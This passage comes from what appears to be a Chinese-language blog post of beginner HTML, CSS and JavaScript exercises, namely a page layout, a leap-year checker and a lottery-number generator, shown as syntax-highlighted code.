class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>Repairs<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>About<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>Contact<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../images/icons2.jpg&quot;</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;Fender Rhodes, Hohner Clavinet and Wurlizer EP200&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\tWe specialize in the sale and repair of classic keyboards, in particular the Fender Rhodes, Wurlizer EP200 and Hohner Clavinet.</span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"布局-html\"><a href=\"#布局-html\" class=\"headerlink\" title=\"布局.html\"></a>布局.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#page</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">960px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">0</span> auto;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">header</span>, <span class=\"selector-tag\">footer</span>, <span class=\"selector-id\">#main</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">10px</span> <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">header</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">150px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: lightgoldenrodyellow;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#main</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">600px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: lightpink;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">footer</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">150px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: lightsalmon;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#logo</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">70%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">nav</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">30%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: lightgray;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">article</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">float</span>: left;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">74%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">100%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin-right</span>: <span class=\"number\">1%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: lightgreen;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">aside</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">float</span>: left;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">25%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">100%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: lightcyan;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;page&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">&lt;!-- 页眉（logo+导航） --&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">header</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;logo&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">nav</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">nav</span>&gt;</span> <span class=\"comment\">&lt;!--导航--&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">header</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">&lt;!-- 主体（多栏） --&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;main&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">article</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">article</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">aside</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">aside</span>&gt;</span> <span class=\"comment\">&lt;!--侧边栏--&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">&lt;!-- 页脚（友情链接+版权信息+ICP备案信息） --&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">footer</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">footer</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"JS语法1-html\"><a href=\"#JS语法1-html\" class=\"headerlink\" title=\"JS语法1.html\"></a>JS语法1.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--  </span></span><br><span class=\"line\"><span class=\"comment\">parseInt(3 / 2) 整除</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">！非</span></span><br><span class=\"line\"><span class=\"comment\">!!str - 布尔</span></span><br><span class=\"line\"><span class=\"comment\">== 不带类型比较</span></span><br><span class=\"line\"><span class=\"comment\">=== 带类型比较</span></span><br><span class=\"line\"><span class=\"comment\">!== 带类型比较</span></span><br><span class=\"line\"><span class=\"comment\">true == 1 不带类型</span></span><br><span class=\"line\"><span class=\"comment\">false == 0 不带类型</span></span><br><span class=\"line\"><span class=\"comment\">&gt;= 不带类型比较（隐式类型比较）</span></span><br><span class=\"line\"><span class=\"comment\">typeof 变量 - 查看类型</span></span><br><span class=\"line\"><span class=\"comment\">MDN web DOC: https://developer.mozilla.org/zh-CN/</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// var / let / const</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// JS中的比较运算符带有隐式的类型转换</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// === / !== / &amp;&amp; / || / ! （a=&#x27;1&#x27;,b=1 a==b成立，a===b严格等于不成立）</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// 分支结构 - if...else... / switch...case...default..</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// 循环结构 - while / for / do...while</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// JS中的数据类型：</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// - 简单数据类型: string / number / boolean / undefined / symbol / null</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// - 复杂数据类型：object</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// 检查变量或常量的数据类型可以使用typeof关键字</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">var</span> yearStr = <span class=\"title function_\">prompt</span>(<span class=\"string\">&#x27;请输入年份：&#x27;</span>) <span class=\"comment\">/* var 变量；const 常量 */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">var</span> year = <span class=\"built_in\">parseInt</span>(yearStr)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// &amp;&amp; - and - 短路与运算</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// 一对花括号可以构成一个块级作用域 - let定义的变量就是块级作用域变量</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">if</span> (year == yearStr &amp;&amp; year &gt; <span class=\"number\">0</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"comment\">// || - or - 短路或运算</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"comment\">// 逻辑运算（短路运算）会产生一个布尔值要么是true要么是false</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> isLeap = (year % <span class=\"number\">4</span> == <span class=\"number\">0</span> &amp;&amp; year % <span class=\"number\">100</span> != <span class=\"number\">0</span>) || year % <span class=\"number\">400</span> == <span class=\"number\">0</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> yesOrNo = isLeap? <span class=\"string\">&#x27;是&#x27;</span> : <span class=\"string\">&#x27;不是&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"comment\">// ES6语法中的带占位符的字符串</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"title function_\">alert</span>(<span class=\"string\">`<span class=\"subst\">$&#123;year&#125;</span>年<span class=\"subst\">$&#123;yesOrNo&#125;</span>闰年`</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"title function_\">alert</span>(<span class=\"string\">&#x27;请输入有效的年份&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// var answer = parseInt(Math.random() * 100 + 1)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// var counter = 0</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// do &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tcounter += 1</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tlet yourInput = prompt(&#x27;请输入你猜的数字：&#x27;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tif (yourInput &gt; answer) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\talert(&#x27;小一点&#x27;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t&#125; else if (yourInput &lt; answer) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\t\talert(&#x27;大一点&#x27;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t&#125; else &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\talert(&#x27;恭喜你猜对了&#x27;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t&#125;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// &#125; while (answer != yourInput)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// if (counter &gt; 7) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \talert(&#x27;智商余额不足&#x27;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// &#125;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// switch...case...default...</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// var face = parseInt(Math.random() * 6 + 1)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// switch (face) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tcase 1: console.log(&#x27;学狗叫&#x27;); break</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tcase 2: console.log(&#x27;真心话&#x27;); break</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tcase 3: console.log(&#x27;大冒险&#x27;); break</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tdefault: console.log(&#x27;喝一杯&#x27;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// &#125;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"JS语法2-html\"><a href=\"#JS语法2-html\" class=\"headerlink\" title=\"JS语法2.html\"></a>JS语法2.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.red</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>:<span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>:<span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-radius</span>:<span class=\"number\">50%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-size</span>: <span class=\"number\">25px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: white;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">line-height</span>: <span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background</span>: red;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">display</span>: inline-block;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin-left</span>: <span class=\"number\">10px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.blue</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>:<span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>:<span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-radius</span>:<span class=\"number\">50%</span>; <span class=\"comment\">/* 圆形边框 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-size</span>: <span class=\"number\">25px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: white;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">line-height</span>: <span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background</span>: blue;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">display</span>: inline-block; <span class=\"comment\">/* 横向排列 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin-left</span>: <span class=\"number\">10px</span>; <span class=\"comment\">/* 元素间距 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!-- 浏览器中的JS包含以下三洋内容 --&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!-- ECMAScript - ES6 - 核心语法 --&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!-- BOM - 浏览器对象模型 - window --&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!-- DOM - 文档对象模型 - document --&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// 双色球 - 6个红色球+1个蓝色球</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// 红色球1-33不重复选出6个号码</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// 蓝色球1-16选出1个号码</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">/* var str = `hello, world</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\tgoodbye world` */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">function</span> <span class=\"title function_\">outputBall</span>(<span class=\"params\">num, color=<span class=\"string\">&#x27;red&#x27;</span></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(<span class=\"string\">`&lt;p class=&quot;<span class=\"subst\">$&#123;color&#125;</span>&quot;&gt;`</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">if</span> (num &lt; <span class=\"number\">10</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(<span class=\"string\">&#x27;0&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(num)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(<span class=\"string\">&#x27;&lt;/p&gt;&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// 方法一</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// var redBalls = []</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// for (let i = 0; i &lt; 33; i += 1) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tredBalls.push(i + 1) /* 增加元素 */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// &#125;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// var selectedBalls = []</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// for (let i = 1; i &lt;= 6; i += 1) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t// 产生随机的下标</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tlet index = parseInt(Math.random() * redBalls.length)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t// 通过下标获取红色球放到数组中</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tselectedBalls.push(redBalls[index])</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t// 删除数组中指定位置的元素</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tredBalls.splice(index, 1)  /*splice(定位, 元素个数, 替换元素) 插入/删除/替换元素 */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// &#125; </span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">var</span> selectedBalls = []</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">while</span> (selectedBalls.<span class=\"property\">length</span> &lt; <span class=\"number\">6</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> num = <span class=\"built_in\">parseInt</span>(<span class=\"title class_\">Math</span>.<span class=\"title function_\">random</span>() * <span class=\"number\">33</span> + <span class=\"number\">1</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">if</span> (selectedBalls.<span class=\"title function_\">indexOf</span>(num) == -<span class=\"number\">1</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\tselectedBalls.<span class=\"title function_\">push</span>(num)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// 给红色球排序 - 需要传入一个匿名函数给出比较元素的规则</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// ES6开始支持使用箭头函数（Lambda函数 - 匿名函数）</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\tselectedBalls.<span class=\"title function_\">sort</span>(<span class=\"function\">(<span class=\"params\">x, y</span>) =&gt;</span> x - y) <span class=\"comment\">/* (function (x, 